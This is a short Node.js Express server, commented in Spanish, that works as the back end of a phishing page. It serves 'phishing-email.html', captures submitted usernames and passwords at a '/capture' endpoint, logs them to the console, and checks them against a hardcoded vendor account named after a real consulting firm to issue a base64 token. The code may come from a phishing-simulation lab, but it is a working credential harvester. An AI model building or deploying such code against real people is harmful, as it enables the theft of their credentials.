const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();

// Middleware para parsear formularios
app.use(bodyParser.urlencoded({ extended: true }));

// Simula la “tabla” de proveedores (vendors)
const vendors = [
  { user: 'deloitte_user', pass: 'Deloitte#123' }
];

let data_store = { user: null, pass: null };

// Servir la página de phishing
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'phishing-email.html'));
});

// Captura las credenciales
app.post('/capture', (req, res) => {
  const { user, pass } = req.body;
  data_store = { user, pass };
  console.log('data_store:', data_store);
  res.send('Credenciales recibidas.');
});

// Endpoint de autenticación
app.post('/auth', (req, res) => {
  const { user, pass } = data_store;
  const match = vendors.find(v => v.user === user && v.pass === pass);
  if (match) {
    const token = Buffer.from(`${user}:${pass}`).toString('base64');
    return res.json({ token });
  }
  res.status(401).send('Unauthorized');
});

// Escuchar en todas las interfaces del contenedor
app.listen(3000, '0.0.0.0', () => {
  console.log('Vendor Auth running on 3000');
});
